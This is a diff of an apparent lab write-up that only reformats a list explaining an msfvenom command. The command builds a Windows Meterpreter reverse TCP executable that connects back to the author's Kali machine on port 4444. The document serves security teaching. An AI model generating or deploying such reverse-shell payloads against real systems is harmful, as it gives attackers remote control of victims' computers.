@@ -87,9 +87,9 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=4444 -
 
 ### Flag Breakdown
 
-- -p windows/x64/meterpreter/reverse_tcp: Generates a 64-bit Windows Meterpreter reverse TCP payload.
-- LHOST=192.168.5.128: The IP address of my Kali machine that receives the reverse connection.
-- LPORT=4444: The port on my Kali machine that listens for the incoming Meterpreter session.
-- -f exe: Generates the payload as a Windows executable (.exe).
-- -o reverse.exe: Saves the generated payload as reverse.exe.
+- `-p windows/x64/meterpreter/reverse_tcp`: Generates a 64-bit Windows Meterpreter reverse TCP payload.
+- `LHOST=192.168.5.128`: The IP address of my Kali machine that receives the reverse connection.
+- `LPORT=4444`: The port on my Kali machine that listens for the incoming Meterpreter session.
+- `-f exe`: Generates the payload as a Windows executable (.exe).
+- `-o reverse.exe`: Saves the generated payload as reverse.exe.
 
